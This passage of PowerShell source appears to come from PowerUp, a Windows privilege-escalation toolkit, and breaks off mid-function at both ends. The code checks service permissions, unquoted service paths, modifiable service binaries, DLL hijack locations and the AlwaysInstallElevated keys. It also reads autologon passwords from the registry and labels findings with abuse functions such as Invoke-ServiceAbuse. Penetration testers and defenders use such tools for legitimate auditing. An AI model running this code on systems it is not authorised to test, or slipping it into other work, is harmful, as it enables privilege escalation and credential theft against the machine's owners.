                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if($TempPath -and ($TempPath -ne '')) {
                                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                        if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                        # trap because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
                                    }
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if($CurrentUserSids -contains $IdentitySID) {
                            New-Object -TypeName PSObject -Property @{
                                ModifiablePath = $CandidatePath
                                IdentityReference = $_.IdentityReference
                                Permissions = $Permissions
                            }
                        }
                    }
                }
            }
        }
    }
}


function Get-CurrentUserTokenGroupSid {
<#
    .SYNOPSIS

        Returns all SIDs that the current user is a part of, whether they are disabled or not.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        First gets the current process handle using the GetCurrentProcess() Win32 API call and feeds
        this to OpenProcessToken() to open up a handle to the current process token. The API call
        GetTokenInformation() is then used to enumerate the TOKEN_GROUPS for the current process
        token. Each group is iterated through and the SID structure is converted to a readable
        string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
        (disabled or not) is returned as a string array.

    .LINK

        https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
#>

    [CmdletBinding()]
    Param()

    $CurrentProcess = $Kernel32::GetCurrentProcess()

    $TOKEN_QUERY= 0x0008

    # open up a pseudo handle to the current process- don't need to worry about closing
    [IntPtr]$hProcToken = [IntPtr]::Zero
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Success) {
        $TokenGroupsPtrSize = 0
        # Initial query to determine the necessary buffer size
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)

        [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

        # query the current process token with the 'TokenGroups=2' TOKEN_INFORMATION_CLASS enum to retrieve a TOKEN_GROUPS structure
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($Success) {

            $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS

            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                # convert each token group SID to a displayable string
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                else {
                    $GroupSid = New-Object PSObject
                    $GroupSid | Add-Member Noteproperty 'SID' $SidString
                    # cast the atttributes field as our SidAttributes enum
                    $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                    $GroupSid
                }
            }
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $LastError)
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
    }
    else {
        Write-Warning ([ComponentModel.Win32Exception] $LastError)
    }
}


function Add-ServiceDacl {
<#
    .SYNOPSIS

        Adds a Dacl field to a service object returned by Get-Service.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause

    .DESCRIPTION

        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
        Dacl field to each object. It does this by opening a handle with ReadControl for the
        service with using the GetServiceHandle Win32 API call and then uses
        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

    .PARAMETER Name

        An array of one or more service names to add a service Dacl for. Passable on the pipeline.

    .EXAMPLE

        PS C:\> Get-Service | Add-ServiceDacl

        Add Dacls for every service the current user can read.

    .EXAMPLE

        PS C:\> Get-Service -Name VMTools | Add-ServiceDacl

        Add the Dacl to the VMTools service object.

    .OUTPUTS

        ServiceProcess.ServiceController

    .LINK

        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ReadControl = 0x00020000

            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))

            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # 122 == The data area passed to a system call is too small
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }

                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}

function Test-ServiceDaclPermission {
<#
    .SYNOPSIS

        Tests one or more passed services or service names against a given permission set,
        returning the service objects where the current user have the specified permissions.

        Author: @harmj0y, Matthew Graeber (@mattifestation)
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
        a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
        user are enumerated services where the user has some type of permission are filtered. The
        services are then filtered against a specified set of permissions, and services where the
        current user have the specified permissions are returned.

    .PARAMETER Name

        An array of one or more service names to test against the specified permission set.

    .PARAMETER Permissions

        A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
        'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
        'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
        'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'

    .PARAMETER PermissionSet

        A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.

    .OUTPUTS

        ServiceProcess.ServiceController

    .EXAMPLE

        PS C:\> Get-Service | Test-ServiceDaclPermission

        Return all service objects where the current user can modify the service configuration.

    .EXAMPLE

        PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'

        Return all service objects that the current user can restart.


    .EXAMPLE

        PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'

        Return the VulnSVC object if the current user has start permissions.

    .LINK

        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if($TargetService -and $TargetService.Dacl) {

                # enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-ServiceUnquoted {
<#
    .SYNOPSIS

        Returns the name and binary path for services with unquoted paths
        that also have a space in the name.

    .EXAMPLE

        PS C:\> $services = Get-ServiceUnquoted

        Get a set of potentially exploitable services.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
#>
    [CmdletBinding()] param()

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name

                if($ServiceRestart) {
                    $CanRestart = $True
                }
                else {
                    $CanRestart = $False
                }

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {
<#
    .SYNOPSIS

        Enumerates all services and returns vulnerable service files.

    .DESCRIPTION

        Enumerates all services by querying the WMI win32_service class. For each service,
        it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
        if the current user has rights to modify the service binary itself or any associated
        arguments. If the associated binary (or any configuration files) can be overwritten,
        privileges may be able to be escalated.

    .EXAMPLE

        PS C:\> Get-ModifiableServiceFile

        Get a set of potentially exploitable service binares/config files.
#>
    [CmdletBinding()] param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {

            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName

            if($ServiceRestart) {
                $CanRestart = $True
            }
            else {
                $CanRestart = $False
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $($_.Permissions -join ", ")
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
}


function Get-ModifiableService {
<#
    .SYNOPSIS

        Enumerates all services and returns services for which the current user can modify the binPath.

    .DESCRIPTION

        Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
        the current user has rights to change the service configuration.

    .EXAMPLE

        PS C:\> Get-ModifiableService

        Get a set of potentially exploitable services.
#>
    [CmdletBinding()] param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {

        $ServiceDetails = $_ | Get-ServiceDetail

        $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'

        if($ServiceRestart) {
            $CanRestart = $True
        }
        else {
            $CanRestart = $False
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
        $Out
    }
}


function Get-ServiceDetail {
<#
    .SYNOPSIS

        Returns detailed information about a specified service by querying the
        WMI win32_service class for the specified service name.

    .DESCRIPTION

        Takes an array of one or more service Names or ServiceProcess.ServiceController objedts on
        the pipeline object returned by Get-Service, extracts out the service name, queries the
        WMI win32_service class for the specified service for details like binPath, and outputs
        everything.

    .PARAMETER Name

        An array of one or more service names to query information for.

    .EXAMPLE

        PS C:\> Get-ServiceDetail -Name VulnSVC

        Gets detailed information about the 'VulnSVC' service.

    .EXAMPLE

        PS C:\> Get-Service VulnSVC | Get-ServiceDetail

        Gets detailed information about the 'VulnSVC' service.
#>

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                try {
                    $_
                }
                catch{
                    Write-Verbose "Error: $_"
                    $null
                }
            }
        }
    }
}


########################################################
#
# DLL Hijacking
#
########################################################

function Find-ProcessDLLHijack {
<#
    .SYNOPSIS

        Finds all DLL hijack locations for currently running processes.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        Enumerates all currently running processes with Get-Process (or accepts an
        input process object from Get-Process) and enumerates the loaded modules for each.
        All loaded module name exists outside of the process binary base path, as those
        are DLL load-order hijack candidates.

    .PARAMETER Name

        The name of a process to enumerate for possible DLL path hijack opportunities.

    .PARAMETER ExcludeWindows

        Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*

    .PARAMETER ExcludeProgramFiles

        Exclude paths from C:\Program Files\* and C:\Program Files (x86)\*

    .PARAMETER ExcludeOwned

        Exclude processes the current user owns.

    .EXAMPLE

        PS C:\> Find-ProcessDLLHijack

        Finds possible hijackable DLL locations for all processes.

    .EXAMPLE

        PS C:\> Get-Process VulnProcess | Find-ProcessDLLHijack

        Finds possible hijackable DLL locations for the 'VulnProcess' processes.

    .EXAMPLE

        PS C:\> Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles

        Finds possible hijackable DLL locations not in C:\Windows\* and
        not in C:\Program Files\* or C:\Program Files (x86)\*

    .EXAMPLE

        PS C:\> Find-ProcessDLLHijack -ExcludeOwned

        Finds possible hijackable DLL location for processes not owned by the
        current user.

    .LINK

        https://www.mandiant.com/blog/malware-persistence-windows-registry/
#>

    [CmdletBinding()]
    Param(
        [Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        # the known DLL cache to exclude from our findings
        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith(".dll") }
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # get the owners for all processes
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent

                    $LoadedModules = $TargetProcess.Modules

                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        # if the module path doesn't exist in the process base path folder
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            # output the process name and hijackable path if exclusion wasn't marked
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {
<#
    .SYNOPSIS

        Finds all directories in the system %PATH% that are modifiable by the current user.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
        to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
        written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
        order loading.

    .EXAMPLE

        PS C:\> Find-PathDLLHijack

        Finds all %PATH% .DLL hijacking opportunities.

    .LINK

        http://www.greyhathacker.net/?p=738
#>

    [CmdletBinding()]
    Param()

    # use -LiteralPaths so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_

        $ModifiablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach($ModifiablePath in $ModifiablePaths) {
            if($ModifiablePath.ModifiablePath -ne $Null) {
                $ModifiablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifiablePath.Permissions = $ModifiablePath.permissions -join ', '
                $ModifiablePath
            }
        }
    }
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegistryAlwaysInstallElevated {
<#
    .SYNOPSIS

        Checks if any of the AlwaysInstallElevated registry keys are set.

    .DESCRIPTION

        Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
        or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
        are set, $False otherwise. If one of these keys are set, then all .MSI files run with
        elevated permissions, regardless of current user permissions.

    .EXAMPLE

        PS C:\> Get-RegistryAlwaysInstallElevated

        Returns $True if any of the AlwaysInstallElevated registry keys are set.
#>

    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {
<#
    .SYNOPSIS

        Finds any autologon credentials left in the registry.

    .DESCRIPTION

        Checks if any autologon accounts/credentials are set in a number of registry locations.
        If they are, the credentials are extracted and returned as a custom PSObject.

    .EXAMPLE

        PS C:\> Get-RegistryAutoLogon

        Finds any autologon credentials left in the registry.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
#>

    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

